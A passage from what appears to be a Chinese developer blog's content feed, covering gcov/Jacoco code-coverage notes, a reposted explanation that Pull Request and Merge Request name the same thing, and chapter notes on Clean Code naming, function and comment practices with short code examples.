-ftest-coverage选项，链接的时候也加上。</p><p><code>fprofile-arcs</code>参数使gcc创建一个程序的流图，之后找到适合图的生成树。只有不在生成树中的弧被操纵（instrumented）：gcc添加了代码来清点这些弧执行的次数。当这段弧是一个块的唯一出口或入口时，操纵工具代码（instrumentation code)将会添加到块中，否则创建一个基础块来包含操纵工具代码。</p><p>gcov主要使用<code>.gcno</code>和<code>.gcda</code>两个文件：</p><ol><li><code>.gcno</code>是由<code>-ftest-coverage</code>产生的，它包含了重建基本块图和相应的块的源码的行号的信息。</li><li><code>.gcda</code>是由加了<code>-fprofile-arcs</code>编译参数的编译后的文件运行所产生的，它包含了弧跳变的次数和其他的概要信息（而gcda只能在程序运行完毕后才能产生的）</li></ol><p><strong>参考</strong>：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/402463278" target="_blank" rel="noopener">使用 Gcov 和 LCOV 度量 C/C++ 项目的代码覆盖率</a></li><li><a href="https://segmentfault.com/a/1190000040733605" target="_blank" rel="noopener">源码分析 | 使用 gcov 和 lcov 测试 PostgreSQL 代码覆盖率</a></li><li><a href="https://www.cnblogs.com/ChinaHook/p/5508660.html" target="_blank" rel="noopener">lcov收集覆盖率</a></li></ul><p><strong>实践部分详见</strong> 博客：<code>C/C++项目的全量覆盖率和增量覆盖率</code></p><h2 id="52-jacoco"><a class="markdownIt-Anchor" href="#52-jacoco"></a> 5.2 Jacoco</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/363864068" target="_blank" rel="noopener">Java代码覆盖率工具Jacoco上手指引</a></li><li><a href="https://juejin.cn/post/7001005602994389005" target="_blank" rel="noopener">基于Jacoco的增量覆盖率实现与落地</a></li><li><a href="https://zhuanlan.zhihu.com/p/337957182" target="_blank" rel="noopener">滴滴开源Super-jacoco：java代码覆盖率收集平台</a></li><li><a href="https://www.cxyzjd.com/article/zou90512/102163415" target="_blank" rel="noopener">DevOps - Java增量代码覆盖率工具_zou90512的专栏-程序员宅基地_java增量覆盖率</a></li><li><a href="https://www.bilibili.com/video/BV1ba4y1v7K6" target="_blank" rel="noopener">onthefly动态插桩覆盖率统计</a></li></ul><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://zhuanlan.zhihu.com/p/144826192" target="_blank" rel="noopener">什么是代码覆盖率？</a></li><li><a href="https://zhuanlan.zhihu.com/p/397701541" target="_blank" rel="noopener">关于代码覆盖率(Code Coverage)</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 未分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待补充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MR(merge request) vs PR(pull request)</title>
      <link href="/2022/04/15/MR-merge-request-vs-PR-pull-request/"/>
      <url>/2022/04/15/MR-merge-request-vs-PR-pull-request/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p><strong>转载</strong>：<a href="https://mp.weixin.qq.com/s?__biz=MzkwNzI0MzQ2NQ==&amp;mid=2247489125&amp;idx=2&amp;sn=735299f1744b1074e54cbeeaeadc1e9c&amp;source=41#wechat_redirect" target="_blank" rel="noopener">啥是 PR？啥又是MR？</a></p></blockquote><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p>在团队中我承担了<code>Committer</code> 的责任，也就是帮同事们检视代码（<code>Code Review</code>）和合入代码，经常听到有同事在群里喊：“大佬，帮我合个 PR”，“大佬，我刚提交了一个 MR，帮忙合一下，急着出补丁”。我有点懵了，<code>PR</code> 和 <code>MR</code> 到底哪个才是正确的，这两个到底有什么区别，我决定先搞清楚这两个概念再合入他们的代码。[手动滑稽]</p><h1 id="2-什么是pull-request"><a class="markdownIt-Anchor" href="#2-什么是pull-request"></a> 2 什么是Pull Request？</h1><p><code>PR</code> 的全称是<code>Pull Request</code>，经常用 <code>Github</code> 的同学对这个肯定很熟悉了。Github 聚集了4000万开发者，过亿的开源项目，如果想给别人的开源仓库贡献代码，通常是先 <code>fork</code> 别人的项目，然后本地修改完成提交到自己的个人 fork 仓库，最后提交 PR 等待别人合入你的代码。</p><p>Github 的工作流（fork 工作流）：</p><img src="https://s2.loli.net/2022/04/15/CLTr3VjuGOwJUBg.png" width="400" height="400" alt="fork 工作流" align="center" id="150"><p>我们重点看一下第6步，小明写完代码了想合入到原作者的仓库，新建了一个“<code>pull request</code>”，拉请求？这明明是推啊，小明将自己的修改推到原作者的仓，感觉叫“<code>push request</code>”比较合适吧。</p><p>既然 Github 坚持叫“<code>pull request</code>”，我们试着理解一下它的思路，小明写完代码了心里肯定是在想：<code>原作者大神，我改了点东西，你快把我的修改拉回去吧</code>。站在原作者的角度思考，叫pull request好像也说得过去，每天有大量的人从我这里 fork 代码走，我只会拉取我感兴趣的代码回来。</p><p>我好像把自己说服了。</p><h1 id="3-什么是-merge-request"><a class="markdownIt-Anchor" href="#3-什么是-merge-request"></a> 3 什么是 Merge Request？</h1><p>MR 的全称是 <code>Merge Request</code>，相信玩过 Gitlab 的同学都知道这个。</p><p>插播一下，Github这么好用了为什么还有人玩 Gitlab，这就要几年前说起了。在微软没有收购 Github 之前，Github 上面所有的项目必须是公开的，也就是说自己很渣的代码也必须要公开，不能藏着噎着。但是在一些小的公司或者创业团队，代码这种核心资产是不希望被公开，他们迫切需要私密仓这种需求，所以很多人都选择了 Gitlab。当然后面 Github 也放开了私有仓库，这是后话了。</p><p>merge 工作流：</p><img src="https://s2.loli.net/2022/04/15/q4NIh1H7ZVA9CR2.png" width="500" height="400" alt="merge 工作流" align="center" id="151"><p>团队中每个人都从远程仓库 develop 分支拉取代码，本地基于 develop 分支新建特性分支，修改完代码将特性分支推到远程仓，紧接着新建 Merge Request 期望将自己的特性分支合入 develop 分支。</p><p>从上面这个流程来看Merge Request 就是将自己的特性分支合入到主干分支。</p><h1 id="4-pull-request-vs-merge-request"><a class="markdownIt-Anchor" href="#4-pull-request-vs-merge-request"></a> 4 Pull Request VS Merge Request</h1><p>总结一下上面两个例子。</p><p>Github 是玩 fork 模式的，开发者提交自己的代码新建 Pull Request，请求原作者：“把我的代码拉回去吧”。</p><p>Gitlab 是玩分支模式的，开发者提交自己的代码新建 Merge Request，想将自己的特性分支合并到主干。</p><p>上面总结的好像很有道理，但是不要忘了，Github 也可以玩分支模式，Gitlab 也可以玩 fork 模式，更令人无语的是：</p><p>Github 上合并分支还是叫 Pull Request；Gitlab 上fork 模式也是叫 Merge Request；</p><p>不行，这种答案我没法接受，去 stackoverflow上搜一些大家是怎么理解的。果然有一个帖子很火：</p><p>Pull request vs Merge request</p><p>有一个回答摘取了 Gitlab 的官方解释：</p><blockquote><p>Merge or pull requests are created in a git management application and ask an assigned person to merge two branches. Tools such as GitHub and Bitbucket choose the name pull request since the first manual action would be to pull the feature branch. Tools such as GitLab and Gitorious choose the name merge request since that is the final action that is requested of the assignee. In this article we’ll refer to them as merge requests.</p></blockquote><p>翻译过来简单理解就是：这两个没有本质区别，站在不同立场说法不一样而已。</p><p><strong>好了，官方已经盖棺定论了，这两个就是一个东西，不要纠结啦~</strong></p><h1 id="5-疯狂吐槽"><a class="markdownIt-Anchor" href="#5-疯狂吐槽"></a> 5 疯狂吐槽</h1><p>对于初学者来说，Github 的 pull request 确实让人难以理解，我们去各大网站看看用户的声音。</p><p>StackOverflow：</p><img src="https://s2.loli.net/2022/04/15/f8jlvChkSD5FBxi.png" width="600" height="400" alt="merge 工作流" align="center" id="152"><p>知乎：</p><img src="https://s2.loli.net/2022/04/15/LGJDK7hlTadr3Pn.png" width="600" height="400" alt="merge 工作流" align="center" id="153"><p>从国外到国内都有大量的用户对这个名字不理解，明明是提交提交代码，为什么是 pull request，有些人甚至怀疑是名字打错了。</p><p>如果让我来给 Github 取名字，我可能会取：</p><ul><li><code>push request</code> 推请求</li><li><code>merge request</code> 合并请求</li></ul><p>想多了，不会有如果。[嘿哈]</p><h1 id="6-总结"><a class="markdownIt-Anchor" href="#6-总结"></a> 6 总结</h1><p><code>Pull Request</code> 和<code>Merge Request</code> 本质上都是合入代码，只是站在不同角度有不同的说法而已，因此在学习和工作中无论用哪一个都没有问题。</p><p>鼓励大家在 GitHub上多多提交 PR，为个人简历加分</p>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《代码整洁之道 clean code》笔记</title>
      <link href="/2022/04/15/%E3%80%8A%E4%BB%A3%E7%A0%81%E6%95%B4%E6%B4%81%E4%B9%8B%E9%81%93%20clean%20code%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/04/15/%E3%80%8A%E4%BB%A3%E7%A0%81%E6%95%B4%E6%B4%81%E4%B9%8B%E9%81%93%20clean%20code%E3%80%8B%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><ul><li>《代码整洁之道 Clean Code》Robert C. Martin 著 韩磊 译 人民邮电出版社 2020</li><li>《Clean Code(评注版)》Robert C. Martin 著 韩磊 评注 电子工业出版社 2012</li></ul></blockquote><h1 id="ch2-meaningful-names有意义的命名"><a class="markdownIt-Anchor" href="#ch2-meaningful-names有意义的命名"></a> Ch2 Meaningful Names(有意义的命名)</h1><h2 id="21-use-intention-revealing-names名副其实"><a class="markdownIt-Anchor" href="#21-use-intention-revealing-names名副其实"></a> 2.1 Use Intention-Revealing Names(名副其实)</h2><p>如果名称需要注释来补充，那就算不上名副其实。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> d;<span class="comment">//消逝的时间，以日计</span></span><br><span class="line"><span class="keyword">int</span> elapsedTimeInDays;</span><br></pre></td></tr></table></figure><h2 id="22-avoid-disinformation避免误导"><a class="markdownIt-Anchor" href="#22-avoid-disinformation避免误导"></a> 2.2 Avoid Disinformation(避免误导)</h2><p>程序员必须避免留下掩藏代码本意的错误线索。应当避免使用与本意相悖的词。</p><ul><li><p>缩写形式常常带来误导。编写三角计算程序，hp是hypotenuse(直角三角形的斜边)缩写，但也是UNIX平台或类UNIX平台的专有名称。</p></li><li><p>一些词对于程序员有特殊含义，如List：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">accountList;<span class="comment">//一组账号，如果账号的容器并List，就会引起错误的判断。</span></span><br><span class="line"><span class="comment">// 可以换成</span></span><br><span class="line">accountGroup;</span><br><span class="line">bunchOfAccounts;</span><br></pre></td></tr></table></figure></li><li><p>不使用差异较小的名称，不易区分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XYZControllerForEfficientHandlingOfStrings;</span><br><span class="line">XYZControllerForEfficientStorageOfStrings;</span><br></pre></td></tr></table></figure></li><li><p>不用小写字母<code>l</code>和大写字母<code>O</code>做为变量名，容易与数字<code>1</code>和<code>0</code>混淆</p></li></ul><h2 id="23-make-meaningful-distinctions做有意义的区分"><a class="markdownIt-Anchor" href="#23-make-meaningful-distinctions做有意义的区分"></a> 2.3 Make Meaningful Distinctions(做有意义的区分)</h2><ul><li>以数字系列命名：<code>a1,a2,a3...aN</code></li><li>废话：Product类、ProductInfo类、ProductData类三者名称不同，但是意思无区别</li></ul><h2 id="24-use-pronounceable-names使用可读命名"><a class="markdownIt-Anchor" href="#24-use-pronounceable-names使用可读命名"></a> 2.4 Use Pronounceable Names(使用可读命名)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Data genymdhms;<span class="comment">//生成日期，年、月、日、时、分、秒</span></span><br><span class="line">Data generationTimestamp;<span class="comment">//改进</span></span><br></pre></td></tr></table></figure><h2 id="25-use-searchable-names使用可搜索命名"><a class="markdownIt-Anchor" href="#25-use-searchable-names使用可搜索命名"></a> 2.5 Use Searchable Names(使用可搜索命名)</h2><p>不使用单字母名称和数字常量，在代码中找数字<code>7</code>要比找<code>MAX_CLASSES_PER_STUDENT</code>容易多；单字母名称可用在短方法的本地变量(local variables inside short methods)，如循环中的计数因子<code>i</code>，名称长短应与其作用域大小相对应。</p><h2 id="26-avoid-encoding避免编码"><a class="markdownIt-Anchor" href="#26-avoid-encoding避免编码"></a> 2.6 Avoid Encoding(避免编码)</h2><p>把类型或作用域加进命名中，徒然增加了读懂命名的负担。带编码的名称也不便发音，容易打错。</p><ul><li><p>匈牙利语标记法：</p><ul><li>在变量名中用缩写标记变量的类型。</li><li>在Windows的C语言API时代，编译器并不做类型检查，程序员需要匈牙利语标记法来帮助自己记住类型。</li><li>现代编程语言具有更丰富的类型系统，编译器也记得并强制使用类型。而且，人们趋向于使用更小的类、更短的方法，好让每个变量的定义都在视野范围之内。所以，如今HN和其他类型的编码方式纯属多余。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PhoneNumber phoneString;<span class="comment">//类型发生变化时，名称并不发生变化</span></span><br></pre></td></tr></table></figure></li><li><p>成员前缀：不必使用<code>m_</code>前缀来表明成员变量</p></li><li><p>接口和实现(Interfaces and Implementations)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// build an Abstract Factory for the creation of shapes</span></span><br><span class="line">ShapeFactory;<span class="comment">//比较好</span></span><br><span class="line">IShapeFactory;<span class="comment">//I前缀表示接口，是废话</span></span><br><span class="line">ShapeFactoryImp;<span class="comment">//实现比接口好一些</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="27-avoid-mental-mapping避免惯性思维"><a class="markdownIt-Anchor" href="#27-avoid-mental-mapping避免惯性思维"></a> 2.7 Avoid Mental Mapping(避免惯性思维)</h2><p>不应当让读者在脑中把你的名称翻译为他们熟知的名称；这种问题经常出现在选择是使用问题领域术语还是解决方案领域术语时。</p><blockquote><p>聪明程序员和专业程序员之间的区别在于，专业程序员了解，明确是王道。专业程序员善用其能，编写其他人能理解的代码。</p></blockquote><h2 id="28-class-names类名"><a class="markdownIt-Anchor" href="#28-class-names类名"></a> 2.8 Class Names(类名)</h2><ul><li>类名和对象名应该是名词或名词短语，如Customer、WikiPage、Account 和AddressParser。</li><li>避免使用Manager、Processor、Data或Info这样的类名。</li><li>类名不应当是动词。</li></ul><h2 id="29-method-names方法名"><a class="markdownIt-Anchor" href="#29-method-names方法名"></a> 2.9 Method Names(方法名)</h2><ul><li><p>方法名应当是动词或动词短语，如postPayment、deletePage 或save。</p></li><li><p>属性访问器、修改器和断言(accessors, mutators, predicates)应该根据其值命名，并依Javabean 标准1加上get、set和is前缀。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> name=employee.getName();</span><br><span class="line">customer.setName(<span class="string">"mike"</span>);</span><br><span class="line"><span class="keyword">if</span>(paycheck.isPosted())...</span><br></pre></td></tr></table></figure></li><li><p>重载构造器时，使用描述了参数的静态工厂方法名(static factory methods)。例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Complex fulcrumPoint=Complex.FromRealNumber(<span class="number">23.0</span>);</span><br><span class="line"><span class="comment">// 通常好于</span></span><br><span class="line">Complex fulcrumPoint=<span class="keyword">new</span> Complex(<span class="number">23.0</span>);</span><br></pre></td></tr></table></figure><p>可以考虑将相应的构造器设置为private，强制使用这种命名手段。</p></li></ul><h2 id="210-dont-be-cute别抖机灵"><a class="markdownIt-Anchor" href="#210-dont-be-cute别抖机灵"></a> 2.10 Don’t Be Cute(别抖机灵)</h2><p>别用俗语、俚语。</p><h2 id="211-pick-one-word-per-concept每个概念对应一个词"><a class="markdownIt-Anchor" href="#211-pick-one-word-per-concept每个概念对应一个词"></a> 2.11 Pick One Word per Concept(每个概念对应一个词)</h2><p>给每个抽象概念选一个词，并且一以贯之。例如：</p><ul><li>fetch、retrieve和get虽有区别，但在前后一致、团队一致的情况下，可以任取其一，一以贯之。</li><li>还有controller、manager、driver</li></ul><h2 id="212-dont-pun别用双关语"><a class="markdownIt-Anchor" href="#212-dont-pun别用双关语"></a> 2.12 Don’t Pun(别用双关语)</h2><p>避免将同一单词用于不同目的。“一词一义”原则</p><h2 id="213-use-solution-domain-names使用解决方案领域名称"><a class="markdownIt-Anchor" href="#213-use-solution-domain-names使用解决方案领域名称"></a> 2.13 Use Solution Domain Names(使用解决方案领域名称)</h2><p>只有程序员才会读你的代码，所以尽量用那些计算机科学（Computer Science，CS）术语、算法名、模式名、数学术语。</p><h2 id="214-use-problem-domain-names使用问题领域名称"><a class="markdownIt-Anchor" href="#214-use-problem-domain-names使用问题领域名称"></a> 2.14 Use Problem Domain Names(使用问题领域名称)</h2><p>如果不能用程序员熟悉的术语来命名，就采用从所涉问题领域而来的名称。这样负责维护代码的程序员就能去请教领域专家了。</p><blockquote><p>优秀的程序员和设计师，其工作之一就是分离解决方案领域和问题领域的概念。</p></blockquote><h2 id="215-add-meaningful-context添加有意义的语境"><a class="markdownIt-Anchor" href="#215-add-meaningful-context添加有意义的语境"></a> 2.15 Add Meaningful Context(添加有意义的语境)</h2><p>用有良好命名的类、函数或名称空间来放置名称给读者提供语境，如果没这么做，给名称添加前缀。比如：firstName、lastName、street、houseNumber、city、state和zipcode的变量</p><ol><li>如果他们在一起，很明确是构成了一个地址；</li><li>如果只有state，那么很难猜测是地址的一部分；</li><li>可以添加前缀addrFirstName、addrLastName、addrState等，以此提供语境；</li><li>更好的方案是创建名为Address的类。</li></ol><h2 id="216-dont-add-gratutous-context不要添加没用的语境"><a class="markdownIt-Anchor" href="#216-dont-add-gratutous-context不要添加没用的语境"></a> 2.16 Don’t Add Gratutous Context(不要添加没用的语境)</h2><p>只要短名称足够清楚，就要比长名称好，别给名称添加不必要的语境。</p><p>比如：设若有一个名为“加油站豪华版”（Gas Station Deluxe）的应用，每个类不要添加GSD前缀。</p><h1 id="ch3-functions函数"><a class="markdownIt-Anchor" href="#ch3-functions函数"></a> Ch3 Functions(函数)</h1><h2 id="31-small短小"><a class="markdownIt-Anchor" href="#31-small短小"></a> 3.1 Small(短小)</h2><ul><li>if语句、else语句、while 语句等，其中的代码块应该只有一行。该行大抵应该是一个函数调用语句。这样不但能保持函数短小，而且，因为块内调用的函数拥有较具说明性的名称，从而增加了文档上的价值。</li><li>这也意味着函数不应该大到足以容纳嵌套结构。所以，<strong>函数的缩进层级不该多于一层或两层</strong>。当然，这样的函数易于阅读和理解。</li></ul><h2 id="32-do-one-thing只做一件事"><a class="markdownIt-Anchor" href="#32-do-one-thing只做一件事"></a> 3.2 Do One Thing(只做一件事)</h2><p>如果函数只是做了该函数名下同一抽象层上的步骤，则函数还是只做了一件事。</p><p>只做一件事的函数无法被合理地切分为多个区段。</p><h2 id="33-one-level-of-abstraction-per-function每个函数一个抽象层级"><a class="markdownIt-Anchor" href="#33-one-level-of-abstraction-per-function每个函数一个抽象层级"></a> 3.3 One Level of Abstraction per Function(每个函数一个抽象层级)</h2><p>要确保函数只做一件事，函数中的语句都要在同一抽象层级上。</p><p>自顶向下读代码：向下规则。让代码拥有自顶向下的阅读顺序，让每个函数后面都跟着位于下一抽象层级的函数，这样一来，在查看函数列表时，就能循抽象层级向下阅读了。</p><h2 id="34-switch-statementsswitch语句"><a class="markdownIt-Anchor" href="#34-switch-statementsswitch语句"></a> 3.4 Switch Statements(Switch语句)</h2><p>利用多态能够确保每个switch都埋藏在较低的抽象层级，而且永远不重复。</p><h2 id="35-use-descriptive-names使用描述性的名称"><a class="markdownIt-Anchor" href="#35-use-descriptive-names使用描述性的名称"></a> 3.5 Use Descriptive Names(使用描述性的名称)</h2><ul><li>沃德原则：“如果每个例程都让你感到深合己意，那就是整洁代码。” 函数越短小、功能越集中，就越便于取个好名字。</li><li>长而具有描述性的名称，比短而令人费解的名称好，比描述性的长注释好。</li><li>命名方式要保持一致。使用与模块名一脉相承的短语、名词和动词给函数命名。</li></ul><h2 id="36-function-arguments函数参数"><a class="markdownIt-Anchor" href="#36-function-arguments函数参数"></a> 3.6 Function Arguments(函数参数)</h2><p>最理想的参数数量是零（零参数函数），其次是一（单参数函数），再次是二（双参数函数），应尽量避免三（三参数函数）。有足够特殊的理由才能用三个以上参数（多参数函数）。</p><ul><li><p>标识参数：尽量不向函数传入布尔值；</p></li><li><p>参数对象：如果函数看来需要两个、三个或三个以上参数，就说明其中一些参数应该封装为类了。例如，下面两个声明的差别：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Circle <span class="title">makeCircle</span><span class="params">(<span class="keyword">double</span> x, <span class="keyword">double</span> y, <span class="keyword">double</span> radius)</span></span>;</span><br><span class="line"><span class="function">Circle <span class="title">makeCircle</span><span class="params">(Point center, <span class="keyword">double</span> radius)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>参数列表：有时，我们想要向函数传入数量可变的参数。例如，String.format方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.format(<span class="string">"s worked $.2f hours."</span>, name, hours);</span><br></pre></td></tr></table></figure><p>如果可变参数像上例中那样被同等对待，就和类型为List的单个参数没什么两样。这样一来，String.formate实则是二元函数。下列 String.format的声明也很明显是二元的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">format</span><span class="params">(String format, Object...args)</span></span>;</span><br></pre></td></tr></table></figure></li></ul><h2 id="37-have-no-side-effects无副作用"><a class="markdownIt-Anchor" href="#37-have-no-side-effects无副作用"></a> 3.7 Have No Side Effects(无副作用)</h2><p>函数承诺只做一件事，但还是会做其他被藏起来的事。有时，它会对自己类中的变量做出未能预期的改动。有时，它会把变量搞成向函数传递的参数或是系统全局变量。无论哪种情况，都是具有破坏性的，会导致古怪的时序性耦合及顺序依赖。</p><h2 id="38-command-query-separation分隔指令和询问"><a class="markdownIt-Anchor" href="#38-command-query-separation分隔指令和询问"></a> 3.8 Command Query Separation(分隔指令和询问)</h2><p>函数要么做什么事，要么回答什么事，但二者不可得兼。函数应该修改某对象的状态，或是返回该对象的有关信息。两样都干常会导致混乱。</p><ol><li>有两种指令与查询混杂的情况：查询某个状态，再根据状态执行操作；执行某个操作，返回该操作的执行情况。</li><li>最常见的就是函数执行某项操作，其布尔类型的返回值代表操作成功与否。</li></ol><h2 id="39-prefer-exceptions-to-returning-error-codes使用异常代替返回错误码"><a class="markdownIt-Anchor" href="#39-prefer-exceptions-to-returning-error-codes使用异常代替返回错误码"></a> 3.9 Prefer Exceptions to Returning Error Codes(使用异常代替返回错误码)</h2><h2 id="310-dont-repeat-yourself别重复自己"><a class="markdownIt-Anchor" href="#310-dont-repeat-yourself别重复自己"></a> 3.10 Don’t Repeat Yourself(别重复自己)</h2><p>重复可能是软件中一切邪恶的根源。许多原则与实践规则都是为控制与消除重复而创建。例如，</p><ul><li>考德（Codd）数据库范式都是为消灭数据重复而服务；</li><li>面向对象编程是如何将代码集中到基类，从而避免了冗余。</li><li>面向方面编程（Aspect Oriented Programming）、面向组件编程（Component Oriented Programming）多少也都是消除重复的一种策略。</li></ul><h2 id="311-structured-programming结构化编程"><a class="markdownIt-Anchor" href="#311-structured-programming结构化编程"></a> 3.11 Structured Programming(结构化编程)</h2><ul><li>Dijkstra认为，每个函数、函数中的每个代码块都应该有一个入口、一个出口。意味着在每个函数中只该有一个return语句，循环中不能有break 或continue 语句，而且不能有任何 goto语句。</li><li>但对于小函数，这些规则助益不大。只有在大函数中，这些规则才会有明显的好处。</li><li>所以，只要函数保持短小，偶尔出现的returm、break 或continue语句没有坏处，甚至还比单入单出原则更具有表达力。另外一方面，goto只在大函数中才有道理，所以应该尽量避免使用。</li></ul><h2 id="312-如何写出这样的函数"><a class="markdownIt-Anchor" href="#312-如何写出这样的函数"></a> 3.12 如何写出这样的函数</h2><p>并不是一开始就按照规则写函数，需要打磨。</p><h1 id="ch4-comments注释"><a class="markdownIt-Anchor" href="#ch4-comments注释"></a> Ch4 Comments(注释)</h1><ol><li>注释最多也就是一种必须的恶。若编程语言足够有表达力，或者我们长于用这些语言来表达意图，就不需要注释。</li><li>代码在发动，演化；注释不总是随之变动；而代码是唯一真正准确的信息来源。</li></ol><h2 id="41-comments-do-not-make-up-for-bad-code注释不能弥补糟糕的代码"><a class="markdownIt-Anchor" href="#41-comments-do-not-make-up-for-bad-code注释不能弥补糟糕的代码"></a> 4.1 Comments Do Not Make Up for Bad Code(注释不能弥补糟糕的代码)</h2><h2 id="42-explain-yourself-in-code用代码来阐述"><a class="markdownIt-Anchor" href="#42-explain-yourself-in-code用代码来阐述"></a> 4.2 Explain Yourself in Code(用代码来阐述)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方式1</span></span><br><span class="line"><span class="comment">//Check to see if the employee is eligible for full benefits </span></span><br><span class="line"><span class="keyword">if</span> ((employee.flags &amp; HOURLY_FLAG) &amp;&amp; (employee.age &gt;<span class="number">65</span>))</span><br><span class="line"><span class="comment">//方式2</span></span><br><span class="line"><span class="keyword">if</span> (employee.isEligibleForFu11Benefits())</span><br></pre></td></tr></table></figure><h2 id="43-good-comments好注释"><a class="markdownIt-Anchor" href="#43-good-comments好注释"></a> 4.3 Good Comments(好注释)</h2><p>有些注释是必须的，也是有利的。</p><ol><li><p>法律信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Copyright (C)2003,2004,2005 by Object Mentor, Inc. All rights reserved.</span></span><br><span class="line"><span class="comment">//Released under the terms of the GNU General Public License version 2 or later.</span></span><br></pre></td></tr></table></figure></li><li><p>提供信息的注释。以下注释解释了某个抽象方法的返回值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Returns an instance of the Responder being tested.</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> Responder <span class="title">responderInstance</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>对意图的解释</p></li><li><p>阐释：有时，注释把某些晦涩难明的参数或返回值的意义翻译为某种可读形式，也会是有用的。这类注释在低层抽象中较为常见，也应该只出现在低层抽象中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testCompareTo</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WikiPagePath a=PathParser. parse(<span class="string">"PageA"</span>); </span><br><span class="line">    WikiPagePath ab=PathParser. parse(<span class="string">"PageA. PageB"</span>);</span><br><span class="line">    WikiPagePath b=PathParser. parse(<span class="string">"PageB"</span>); </span><br><span class="line">    WikiPagePath aa=PathParser. parse(<span class="string">"PageA. PageA"</span>); </span><br><span class="line">    WikiPagePath bb=PathParser. parse(<span class="string">"PageB. PageB"</span>);</span><br><span class="line">    WikiPagePath ba=PathParser. parse(<span class="string">"PageB. PageA"</span>); </span><br><span class="line">    </span><br><span class="line">    assertTrue(a. compareTo(a)==<span class="number">0</span>);<span class="comment">//a==a</span></span><br><span class="line">    assertTrue(a. compareTo(b)!=<span class="number">0</span>);<span class="comment">//a!=b </span></span><br><span class="line">    assertTrue(ab. compareTo(ab)==<span class="number">0</span>);<span class="comment">//ab==ab </span></span><br><span class="line">    assertTrue(a. compareTo(b)==-<span class="number">1</span>);<span class="comment">//a&lt;b </span></span><br><span class="line">    assertTrue(aa. compareTo(ab)==-<span class="number">1</span>);<span class="comment">//aa&lt; ab </span></span><br><span class="line">    assertTrue(ba. compareTo(bb)==-<span class="number">1</span>);<span class="comment">//ba&lt;bb </span></span><br><span class="line">    assertTrue(b. compareTo(a)==<span class="number">1</span>);<span class="comment">//b&gt;a </span></span><br><span class="line">    assertTrue(ab. compareTo(aa)==<span class="number">1</span>);<span class="comment">//ab&gt;aa </span></span><br><span class="line">    assertTrue(bb. compareTo (ba)==<span 